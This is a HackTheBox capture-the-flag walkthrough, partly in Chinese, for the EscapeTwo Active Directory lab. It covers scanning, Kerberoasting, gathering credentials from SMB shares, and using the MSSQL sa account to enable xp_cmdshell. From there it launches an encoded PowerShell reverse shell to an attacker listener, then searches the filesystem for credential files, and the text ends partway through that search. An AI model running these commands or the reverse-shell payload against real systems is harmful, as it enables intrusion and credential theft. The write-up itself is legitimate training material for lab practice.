---
title: 'HackTheBox: EscapeTwo [Active Directory]'
disqus: hackmd
---

HackTheBox: EscapeTwo [Active Directory]
===

## Topic

### Lab
- HackTheBox: \
https://app.hackthebox.com/machines/EscapeTwo

### Initial Enumeration

● Start Machine: `10.10.11.51`\
![image](https://hackmd.io/_uploads/BJ434F1kgl.png)
> As is common in real life Windows pentests, you will start this box with credentials for the following account: `rose / KxEPkKe6R8su`

```
┌──(chw㉿CHW)-[~]
└─$ nmap -sC -sV -Pn 10.10.11.51
Nmap scan report for 10.10.11.51
Host is up (0.39s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-18 07:47:06Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-04-18T07:48:35+00:00; -1s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
|_ssl-date: 2025-04-18T07:48:34+00:00; -2s from scanner time.
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-04-18T07:48:35+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-04-17T21:52:05
|_Not valid after:  2055-04-17T21:52:05
| ms-sql-info: 
|   10.10.11.51:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.10.11.51:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-18T07:48:35+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-04-18T07:48:34+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Not valid before: 2024-06-08T17:35:00
|_Not valid after:  2025-06-08T17:35:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-04-18T07:47:58
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 126.75 seconds
```
> DNS, SMB, ldap, HTTP, kpasswd5, ms-sql, Kerberos\
> `DC01.sequel.htb`

## Solution

### 1. Kerberoasting
靶機提供一組可用帳號密碼：`rose` / `KxEPkKe6R8su`
```
┌──(chw㉿CHW)-[~]
└─$ sudo impacket-GetUserSPNs -request -dc-ip 10.10.11.51 sequel.htb/rose    
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName     Name     MemberOf                                              PasswordLastSet             LastLogon                   Delegation 
-----------------------  -------  ----------------------------------------------------  --------------------------  --------------------------  ----------
sequel.htb/sql_svc.DC01  sql_svc  CN=SQLRUserGroupSQLEXPRESS,CN=Users,DC=sequel,DC=htb  2024-06-09 03:58:42.689521  2025-05-06 11:01:23.377674             
sequel.htb/ca_svc.DC01   ca_svc   CN=Cert Publishers,CN=Users,DC=sequel,DC=htb          2025-05-06 16:02:28.965833  2025-05-06 12:40:01.700186     


[-] CCache file is not found. Skipping...
$krb5tgs$23$*sql_svc$SEQUEL.HTB$sequel.htb/sql_svc*$a2804f96060bd317c7ceb551bede5a42$cce324d3dc6b920f72bbbb8dff929ecce777b59f1539a729e228aec0e8f850b3514be134d35b6cb382c9016c8b7b37048de571ebf81dcbf0a34640c2e4594ee5a70d3d27beba04bbdfcea71af7bf2f94705f4d6a259bfe00b8eb13cb92451f5e8a8417b2daa961de35c37bd4d026d530a1476396635fb402c55321eaa1718672f726956c4a7dba0e393334a5652e0f3c11116241c77bfff6f0e0f08f71f390628788cc7ba4cb09f14998314a9ab83600b8b983d038a241fdd45d9a312198868babec0ce1653898dfb933f91ed05a21c26ac4458f5d68fd9327d7863ab9336e20e8b940f63ea4749658dc93b64d988fdbcd3d4e653dd21f1ad81441d31f18504dfd1b25c03cfdedb04eda9c5f7449dffa5517d6d2eb1f1c6ee6930ca2ac105551446fa2290e9b64da8b9e524bbec04fb139b5bfe7b19c57d41510a2b21a067093d815f35bfe8bb561e7bbd10d0e05a86b6fe5a6a3ebe7d462b0cebca0472046a5c5e0d6cdf16a6674e29578b36bca3c018a9bc4eeba2adb847b142c2f29d8d573f91e34c4eac373f28f4ceec1bb76e4cfe7266e02dc40108022d0259fee1e2d38f79df61b7ca235893af142cf398440e1a6a24b5e1dc46640844a13a1d5d07ff5bed9ab2a8161660fa04b477fc1**********f25d66c7efe5e62daf44e5806ee9e96f32dbed034f741929d713d7f67a5b2ca67db618c727bdd6cd70592782617ce5ca82e880e35feb0f29eddd6eb84d6fe128f473360eedbc9afc2dabdde39f19cbfb7cda39dbf2daaa831ef78d3c4c5ae17ab4073f1b130dce68c3c551c12d75944f96dd2caf28718c452e4de40c6d266f1ab5bae2fcacc0e0653f5218fa957a871df665a54a71ec93253f06570ea1eea5f2cf6db93954447934fc31b5a71bed0789fcbc31be24c45eef7cefca65971a85ba34e09ea937cd7086bc5bb1dae79df11b508887e485522124ab7e984d3aa75a321ed5577c9ddb3a7208651806a613b8f79cca199fbe523cc898e2c2bbec0a691759a40d3c1df5ffec170e3eb7b66909e854bdeed2c0b1b1f79e199eeb7aeb4331ac4aa1693dc9976595c0a583ae940fe60b1192cce6d0fc9575f7188c1107a14c6aabed5631183051fa4012a32556ee7fd49fecd4be31e1bc18939617c00714e8188ea43a08f294234d12575586c794e6833008a559b31dfc5db3121b56c7844a82f61e05a8b6e8ca07d34adbf2daff5c54831693182ae76c112d1f6d0a0e490111cd63429a7d57dec82c77fda7be12d535aa0fc502ea7437fa03977df0859384b5b7fe549141831821727c986ead46e784fbc9e35349bd9fcd6d826bc2a45908b1737e133e6f8e406ff5e81b0a0d40d3a089acad9635c3b84fe33049e760adcc97cd40e3e84132957295586fda0ff8ab33529b0f7894ffbc**********
$krb5tgs$23$*ca_svc$SEQUEL.HTB$sequel.htb/ca_svc*$2d99e251b2a4e1df55a4b89d72b41f19$e187a02a4e24d8c37ca81f79817ec30b3146e7be7b435f29183216be9510b44520734a551701ac4a1f2d796823595ab38249d2b2c79ebbb174fb15f532b92a03a62ab4c855e492a7da64989a81c94e58280fa5fbe35a829c7e3d531da10418bc9444b785ebb4c3fc889738411f5cbe93ea310c1bc4c6b6624dbc67f8d50452ad320a880f37369aa14555bff721c7fd4d68f5aa389570fecdd9bb64f6e6bb5518e84e8378514366ed87a41eeaef2759d887f8ca71b3528f53841b7000b33179a7ab702258765cd17ec68ec740f92aecb11f23f4c178da91505c0a62f3c8fd91f511a7a5d1f4be8c5eea2204d5243b99c32136b15b5d675f238534a636a9279243f9099b130b69827a23e2cd4a1ea962199eeb4d086c339f1cd11dbe9ef5ff19b0f9d5e9437df379bf438313305cd6126eefc83e4149bfad5d694d510835118c9204e4d9322387b29ab46a3a0c680356c8a6bc4271dd1b7c19f59c9b5af9165835986fb5bbf84a197f06a62a195eb11f430c18f71419b7912900dc8cff5b154c5d58624eb5e24563aadfcec7a5cc19f88e1e27863eca6ac2e68b0e0493c8c537a361804a18a0d08391e8692f9b34d032dbbd789cde7d2308a3690cfff6ec1702471d59bab0cdc99d50466187e1fc99a4f41d35edbe973c24085fa93de5459ce21f1cd6b368add5f19ca09aafc7053a7166424f5c043aaeda021350585ddedc66ec4836c947b94e282bcbac98ae0a0f7f48f5adc8c454e7da7f8877308046f18efdbaaa53b9266461cbc12a1b7cfb8a1e5afd79443423cfb4ac78f9c2edc3d487e044d12a1fcc3265f8f96630308e8c851110ca3d7729f0199f084070a9f3851585a614a30b03d587a131feef94e99d035170d5b8e2c2f8c25f3a5db23fa0e452d0ae658ed46f4ff00af815a2e30ae695658484e57e6ea8a6a595e5b889e45d95960c04f9fefe900a16b116345c7911d432aba075f0c066a766a8e792b4ae6e45ab9d8a54531b79676e475676b643ab7a73dd5117890172d232985a240c6c265ebdf81d5d6b6e4609b11c07978c1a5dad14be7221ca3cdec0478d671bd12cd952b7e50b454b6d38b9e25793320479d118a723c5829d7f87244856fc7c7099782618ea52c76944b5fa2c71787fe7f05d3dffc4fd7eff4889d86e8a4fe1d72c7193b0c4636ac211a6b19e80563c83eba4e89f8ace54ce7d70fc249bf6985372363fb808d56749a09caea490148e32617efd94b9ab677f665cf739e8b0272f16141f654cc0ab77f92d28f9ac1ecd964e6d8942cdd4dd45dc0988b90b204bda9631fb8644f942484e83d411a063f06615bad8b9074bf4921cec479aa4934f6de7c5ce1b9915bbc8f3332fbbd467fb83408953524f22784b94ee6c3b073c6df3dc1644c99cf0cb0b70158e60d8d5**********
```
> 取得兩組 SPN 服務帳號 (SPN Service Ticket)：\
> `sql_svc`, `ca_svc`

爆破 Hash 明文密碼
```
┌──(chw㉿CHW)-[~]
└─$ cat EscapeTwo.hash 
$krb5tgs$23$*sql_svc$SEQUEL.HTB$sequel.htb/sql_svc*$a2804f96060bd317c7ceb551bede5a42$cce324d3dc6b920f72bbbb8dff929ecce777b59f1539a729e228aec0e8f850b3514be134d35b6cb382c9016c8b7b37048de571ebf81dcbf0a34640c2e4594ee5a70d3d27beba04bbdfcea71af7bf2f94705f4d6a259bfe00b8eb13cb92451f5e8a8417b2daa961de35c37bd4d026d530a1476396635fb402c55321eaa1718672f726956c4a7dba0e393334a5652e0f3c11116241c77bfff6f0e0f08f71f390628788cc7ba4cb09f14998314a9ab83600b8b983d038a241fdd45d9a312198868babec0ce1653898dfb933f91ed05a21c26ac4458f5d68fd9327d7863ab9336e20e8b940f63ea4749658dc93b64d988fdbcd3d4e653dd21f1ad81441d31f18504dfd1b25c03cfdedb04eda9c5f7449dffa5517d6d2eb1f1c6ee6930ca2ac105551446fa2290e9b64da8b9e524bbec04fb139b5bfe7b19c57d41510a2b21a067093d815f35bfe8bb561e7bbd10d0e05a86b6fe5a6a3ebe7d462b0cebca0472046a5c5e0d6cdf16a6674e29578b36bca3c018a9bc4eeba2adb847b142c2f29d8d573f91e34c4eac373f28f4ceec1bb76e4cfe7266e02dc40108022d0259fee1e2d38f79df61b7ca235893af142cf398440e1a6a24b5e1dc46640844a13a1d5d07ff5bed9ab2a8161660fa04b477fc1**********f25d66c7efe5e62daf44e5806ee9e96f32dbed034f741929d713d7f67a5b2ca67db618c727bdd6cd70592782617ce5ca82e880e35feb0f29eddd6eb84d6fe128f473360eedbc9afc2dabdde39f19cbfb7cda39dbf2daaa831ef78d3c4c5ae17ab4073f1b130dce68c3c551c12d75944f96dd2caf28718c452e4de40c6d266f1ab5bae2fcacc0e0653f5218fa957a871df665a54a71ec93253f06570ea1eea5f2cf6db93954447934fc31b5a71bed0789fcbc31be24c45eef7cefca65971a85ba34e09ea937cd7086bc5bb1dae79df11b508887e485522124ab7e984d3aa75a321ed5577c9ddb3a7208651806a613b8f79cca199fbe523cc898e2c2bbec0a691759a40d3c1df5ffec170e3eb7b66909e854bdeed2c0b1b1f79e199eeb7aeb4331ac4aa1693dc9976595c0a583ae940fe60b1192cce6d0fc9575f7188c1107a14c6aabed5631183051fa4012a32556ee7fd49fecd4be31e1bc18939617c00714e8188ea43a08f294234d12575586c794e6833008a559b31dfc5db3121b56c7844a82f61e05a8b6e8ca07d34adbf2daff5c54831693182ae76c112d1f6d0a0e490111cd63429a7d57dec82c77fda7be12d535aa0fc502ea7437fa03977df0859384b5b7fe549141831821727c986ead46e784fbc9e35349bd9fcd6d826bc2a45908b1737e133e6f8e406ff5e81b0a0d40d3a089acad9635c3b84fe33049e760adcc97cd40e3e84132957295586fda0ff8ab33529b0f7894ffbc**********
$krb5tgs$23$*ca_svc$SEQUEL.HTB$sequel.htb/ca_svc*$2d99e251b2a4e1df55a4b89d72b41f19$e187a02a4e24d8c37ca81f79817ec30b3146e7be7b435f29183216be9510b44520734a551701ac4a1f2d796823595ab38249d2b2c79ebbb174fb15f532b92a03a62ab4c855e492a7da64989a81c94e58280fa5fbe35a829c7e3d531da10418bc9444b785ebb4c3fc889738411f5cbe93ea310c1bc4c6b6624dbc67f8d50452ad320a880f37369aa14555bff721c7fd4d68f5aa389570fecdd9bb64f6e6bb5518e84e8378514366ed87a41eeaef2759d887f8ca71b3528f53841b7000b33179a7ab702258765cd17ec68ec740f92aecb11f23f4c178da91505c0a62f3c8fd91f511a7a5d1f4be8c5eea2204d5243b99c32136b15b5d675f238534a636a9279243f9099b130b69827a23e2cd4a1ea962199eeb4d086c339f1cd11dbe9ef5ff19b0f9d5e9437df379bf438313305cd6126eefc83e4149bfad5d694d510835118c9204e4d9322387b29ab46a3a0c680356c8a6bc4271dd1b7c19f59c9b5af9165835986fb5bbf84a197f06a62a195eb11f430c18f71419b7912900dc8cff5b154c5d58624eb5e24563aadfcec7a5cc19f88e1e27863eca6ac2e68b0e0493c8c537a361804a18a0d08391e8692f9b34d032dbbd789cde7d2308a3690cfff6ec1702471d59bab0cdc99d50466187e1fc99a4f41d35edbe973c24085fa93de5459ce21f1cd6b368add5f19ca09aafc7053a7166424f5c043aaeda021350585ddedc66ec4836c947b94e282bcbac98ae0a0f7f48f5adc8c454e7da7f8877308046f18efdbaaa53b9266461cbc12a1b7cfb8a1e5afd79443423cfb4ac78f9c2edc3d487e044d12a1fcc3265f8f96630308e8c851110ca3d7729f0199f084070a9f3851585a614a30b03d587a131feef94e99d035170d5b8e2c2f8c25f3a5db23fa0e452d0ae658ed46f4ff00af815a2e30ae695658484e57e6ea8a6a595e5b889e45d95960c04f9fefe900a16b116345c7911d432aba075f0c066a766a8e792b4ae6e45ab9d8a54531b79676e475676b643ab7a73dd5117890172d232985a240c6c265ebdf81d5d6b6e4609b11c07978c1a5dad14be7221ca3cdec0478d671bd12cd952b7e50b454b6d38b9e25793320479d118a723c5829d7f87244856fc7c7099782618ea52c76944b5fa2c71787fe7f05d3dffc4fd7eff4889d86e8a4fe1d72c7193b0c4636ac211a6b19e80563c83eba4e89f8ace54ce7d70fc249bf6985372363fb808d56749a09caea490148e32617efd94b9ab677f665cf739e8b0272f16141f654cc0ab77f92d28f9ac1ecd964e6d8942cdd4dd45dc0988b90b204bda9631fb8644f942484e83d411a063f06615bad8b9074bf4921cec479aa4934f6de7c5ce1b9915bbc8f3332fbbd467fb83408953524f22784b94ee6c3b073c6df3dc1644c99cf0cb0b70158e60d8d5**********

┌──(chw㉿CHW)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --rules=/usr/share/hashcat/rules/best64.rule EscapeTwo.hash
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
No "/usr/share/hashcat/rules/best64.rule" mode rules found in /etc/john/john.conf
```
> 無法爆出明文密碼

### 2. LdapSearch 

```
┌──(chw㉿CHW)-[~/Tools/impacket/examples]
└─$ impacket-ldapsearch -u rose -p 'KxEPkKe6R8su' -d sequel.htb -dc-ip 10.10.11.51 -l 10.10.11.51 -t all  

### Server infos ###
[+] Forest functionality level = Windows 2016
[+] Domain functionality level = Windows 2016
[+] Domain controller functionality level = Windows 2016
[+] rootDomainNamingContext = DC=sequel,DC=htb
[+] defaultNamingContext = DC=sequel,DC=htb
[+] ldapServiceName = sequel.htb:dc01$@SEQUEL.HTB
[+] naming_contexts = ['DC=sequel,DC=htb', 'CN=Configuration,DC=sequel,DC=htb', 'CN=Schema,CN=Configuration,DC=sequel,DC=htb', 'DC=DomainDnsZones,DC=sequel,DC=htb', 'DC=ForestDnsZones,DC=sequel,DC=htb']
### Result of "trusts" command ###
### Result of "pass-pols" command ###
[+] Default password policy:
[+] |__ Minimum password length = 7
[+] |__ Password complexity = Disabled
[*] |__ Lockout threshold = Disabled
[*] |__ Password history length = 24
[+] |__ Max password age = 42 days, 0 hours, 0 minutes, 0 seconds
[+] |__ Min password age = 24 hours, 0 minutes, 0 seconds
[+] No fine grained password policy found (high privileges are required).
### Result of "admins" command ###
[+] All members of group "Domain Admins":
[*]     Administrator (DONT_EXPIRE_PASSWORD)
[+] All members of group "Administrators":
[*]     Administrator (DONT_EXPIRE_PASSWORD)
[+] All members of group "Enterprise Admins":
[*]     Administrator (DONT_EXPIRE_PASSWORD)
### Result of "kerberoast" command ###
[*] ca_svc: sequel.htb/ca_svc.DC01
[*] sql_svc: sequel.htb/sql_svc.DC01
### Result of "asreqroast" command ###
### Result of "goldenticket" command ###
[+] krbtgt password changed at 2024-06-08 16:40:23
```
> 密碼最小長度為 7\
> 其他沒有找到可用線索

### 3. Smbclient
```
┌──(chw㉿CHW)-[~]
└─$ smbclient -L //10.10.11.51 -U "rose"

Password for [WORKGROUP\rose]:

        Sharename       Type      Comment
        ---------       ----      -------
        Accounting Department Disk      
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.51 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
  
┌──(chw㉿CHW)-[~]
└─$ smbclient //10.10.11.51/Users -U "rose"

Password for [WORKGROUP\rose]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sun Jun  9 09:42:11 2024
  ..                                 DR        0  Sun Jun  9 09:42:11 2024
  Default                           DHR        0  Sun Jun  9 07:17:29 2024
  desktop.ini                       AHS      174  Sat Sep 15 03:16:48 2018

                6367231 blocks of size 4096. 928252 blocks available
smb: \> 

┌──(chw㉿CHW)-[~]
└─$ smbclient //10.10.11.51/Accounting\ Department -U "rose"

Password for [WORKGROUP\rose]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jun  9 06:52:21 2024
  ..                                  D        0  Sun Jun  9 06:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 06:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 06:52:07 2024

                6367231 blocks of size 4096. 900385 blocks available
smb: \> 

```
> SMB File Leak:
>  - /User\
> `Default`, `desktop.ini` 
> - Accounting Department\
> `accounting_2024.xlsx`, `accounts.xlsx`

下載檔案
```
┌──(chw㉿CHW)-[~]
└─$ smbclient //10.10.11.51/Accounting\ Department -U "rose" -c "recurse ON; prompt OFF; mget *"
Password for [WORKGROUP\rose]:
getting file \accounting_2024.xlsx of size 10217 as accounting_2024.xlsx (4.9 KiloBytes/sec) (average 4.9 KiloBytes/sec)
getting file \accounts.xlsx of size 6780 as accounts.xlsx (6.3 KiloBytes/sec) (average 5.4 KiloBytes/sec)

┌──(chw㉿CHW)-[~]
└─$ smbclient //10.10.11.51/Users -U "rose" -c "recurse ON; prompt OFF; mget *"
Password for [WORKGROUP\rose]:
getting file \desktop.ini of size 174 as desktop.ini (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
getting file \Default\NTUSER.DAT of size 262144 as Default/NTUSER.DAT (59.7 KiloBytes/sec) (average 49.8 KiloBytes/sec)
getting file \Default\NTUSER.DAT.LOG1 of size 57344 as Default/NTUSER.DAT.LOG1 (48.7 KiloBytes/sec) (average 49.6 KiloBytes/sec)
getting file \Default\NTUSER.DAT.LOG2 of size 0 as Default/NTUSER.DAT.LOG2 (0.0 KiloBytes/sec) (average 44.2 KiloBytes/sec)
getting file \Default\NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf of size 65536 as Default/NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf (55.8 KiloBytes/sec) (average 45.9 KiloBytes/sec)
...
```
下載後的 `accounting_2024.xlsx`, `accounts.xlsx` 是壓縮檔

在 `accounts.xlsx` 中的 `xl/sharedStrings.xml` 找到帳號密碼:\
![image](https://hackmd.io/_uploads/H1a1qyKgge.png)\
整理過後：
>First Name 	Last Name	Email	Username	Password
>- Angela	Martin	angela@sequel.htb	`angela`	`0fwz7Q4mSpurIt99`
>- Oscar	Martinez	oscar@sequel.htb	`oscar`	`86LxLBMgEWaKUnBG`
>- Kevin	Malone	kevin@sequel.htb	`kevin`	`Md9Wlq1E5bZnVDVo`
>- NULL		sa@sequel.htb	`sa`	`MSSQLP@ssw0rd!`

#### 3.1 嘗試 SMB 登入
```
┌──(chw㉿CHW)-[~]
└─$ cat EscapeTwo_name.txt                                                               
sa
angela
oscar
kevin
         
┌──(chw㉿CHW)-[~]
└─$ cat EscapeTwo_pwd.txt                                                                
MSSQLP@ssw0rd!
0fwz7Q4mSpurIt99
86LxLBMgEWaKUnBG
Md9Wlq1E5bZnVDVo

┌──(chw㉿CHW)-[~]
└─$ crackmapexec smb 10.10.11.51 -u EscapeTwo_name.txt -p EscapeTwo_pwd.txt
...
SMB         10.10.11.51     445    DC01             [-] Connection Error: The NETBIOS connection with the remote host timed out.
SMB         10.10.11.51     445    DC01             [-] sequel.htb\oscar:MSSQLP@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [-] sequel.htb\oscar:0fwz7Q4mSpurIt99 STATUS_LOGON_FAILURE 
SMB         10.10.11.51     445    DC01             [+] sequel.htb\oscar:86LxLBMgEWaKUnBG
```
> `oscar`:`86LxLBMgEWaKUnBG` 成功登入 SMB

Enumerate 後沒有發現其他可用資訊

#### 3.2 嘗試 Mssql 登入
使用同一組帳號密碼嘗試登入 Mssql\
以 `escapetwo.htb/sa:MSSQLP@ssw0rd!` 成功登入
```
┌──(chw㉿CHW)-[~]
└─$ impacket-mssqlclient 'escapetwo.htb/sa:MSSQLP@ssw0rd!@10.10.11.51'

Impacket v0.13.0.dev0+20250430.174957.756ca96e - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (sa  dbo@master)> 

```
嘗試 xp_cmdshell RCE
```
SQL (sa  dbo@master)> EXEC xp_cmdshell 'whoami';
ERROR(DC01\SQLEXPRESS): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
SQL (sa  dbo@master)> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> EXEC xp_cmdshell 'whoami';
output           
--------------   
sequel\sql_svc   

NULL             

SQL (sa  dbo@master)> 
```
>[!Note]
> 1. SQL Server 預設把 xp_cmdshell 關閉
> 2. `sp_configure` 用來查詢或設定伺服器層級的參數\
`show advanced options` 控制是否允許調整進階設定（預設為 0）。
將參數設為 1 並執行 RECONFIGURE，告訴 SQL Server 接受並套用「顯示進階選項」的變更
> 3. `EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;`\
在允許進階設定後，用同樣方式將 xp_cmdshell 開啟（設為 1），並 RECONFIGURE 套用。

成功取得 SQL Server Shell，🥚 過幾分鐘就會 `xp_cmdshell`又會被關閉\
👉🏻 嘗試執行 Reverse Shell

### 4. Mssql 塞入 Reverse Shell
參考 [hackingarticles](https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/) 如何建立 Mssql reverse shell\
透過 [Reverse Shell Generator](https://www.revshells.com/) 生成 Windows Reverse Shell payload
```
SQL (sa  dbo@master)> EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA3ADkAIgAsADgAOAA4ADgAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdA
```
開啟監聽 port
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 8888 
```
成功取得 Reverse Shell
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 8888   
listening on [any] 8888 ...
connect to [10.10.14.179] from (UNKNOWN) [10.10.11.51] 49199
PS C:\Windows\system32> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
PS C:\Windows\system32> whoami
sequel\sql_svc
PS C:\Windows\system32> 

```
#### 4.1 檢查 localgroup
```
PS C:\Windows\system32> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
Domain Admins
Enterprise Admins
The command completed successfully.
```
> 想太美 🥶

#### 4.2 尋找相關憑證 / 密碼
```
PS C:\Windows\system32> Get-ChildItem -Recurse -Path C:\Users -Include *.xml,*.ini,*.txt,*.config -ErrorAction SilentlyContinue
PS C:\Windows\system32> Get-ChildItem -Recurse -Path C:\ -Include *.xml,*.ini,*.txt,*.config -ErrorAction SilentlyContinue
...
    Directory: C:\Program Files\Microsoft SQL Server\150\DTS\Binn


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        9/24/2019   2:40 PM           1898 DTExec.exe.config                                                     
-a----        9/24/2019   2:40 PM           1898 dtshost.exe.config                                                    
-a----        9/24/2019   2:40 PM           4470 DTSPERF.INI                                                           
-a----        9/24/2019   2:40 PM           1898 DTSWizard.exe.config                                                  
-a----        9/24/2019   2:40 PM           1898 DTUtil.exe.config                                                     
-a----        9/24/2019   2:40 PM          71494 DtwTypeConversion.xml                                                 


    Directory: C:\Program Files\Microsoft SQL Server\150\DTS\Connections\en


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        9/24/2019   2:40 PM          22303 Microsoft.SqlServer.ManagedConnections.xml
...

    Directory: C:\Program Files (x86)\Microsoft SQL Server Management Studio 20\Common7\IDE\SqlToolsData\1033


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        1/31/2024   3:21 AM          41535 MDXFunctions.xml                                                      
-a----        1/31/2024   3:21 AM         134188 MDXTemplates.xml                                                      
-a----         4/3/2024   3:48 PM           6177 OleSqlCommands.xml                                                    
